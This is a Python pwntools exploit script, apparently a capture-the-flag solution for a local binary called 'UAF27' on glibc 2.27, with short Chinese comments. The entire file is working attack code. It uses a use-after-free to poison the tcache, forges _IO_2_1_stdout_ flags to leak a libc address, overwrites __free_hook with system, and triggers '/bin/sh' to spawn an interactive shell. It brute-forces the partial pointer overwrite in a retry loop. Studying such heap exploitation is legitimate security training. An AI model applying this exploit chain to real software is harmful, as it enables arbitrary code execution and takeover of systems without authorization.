#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

libc = ELF('./libc-2.27.so')
elf = ELF('./UAF27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(idx,length):
	p.sendlineafter(':','1')
	p.sendlineafter('idx:',str(idx))
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

while True:
	try:
		global p
		p = process('./UAF27')

		add(0,0x88) #0 0x250
		add(1,0x88) #1 0x2e0
		add(2,0x30) #2 0x370

		#填满tcachebin
		for i in [1,0,1,0,1,0,1]:
			delete(i)
			edit(i, p64(0)*2)
		delete(1) #放入unsortedbin

		edit(1, '\x60\x97') #修改main_arena低位,_IO_2_1_stdout_
		add(1,0x80)
		edit(1, '\x60\x97')
		add(2,0x80) #分配去_IO_2_1_stdout_

		payload = p64(0xfbad1800) + p64(0)*3 + b"\x58"
		edit(2,payload)
		#pause()
		data = p.recv(10)
		if 'done :)' in data:
			continue
		libcbase = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ec758
		free_hook = libcbase + libc.sym['__free_hook']
		system = libcbase + libc.sym['system']
		pr('libcbase',libcbase)
		
		delete(1)
		edit(1, p64(free_hook))
		add(1, 0x80)
		edit(1, p64(free_hook))
		add(2,0x80) #分配去free_hook

		edit(2, p64(system))
		edit(1, '/bin/sh')
		delete(1)
		p.interactive()
	except:
		pass

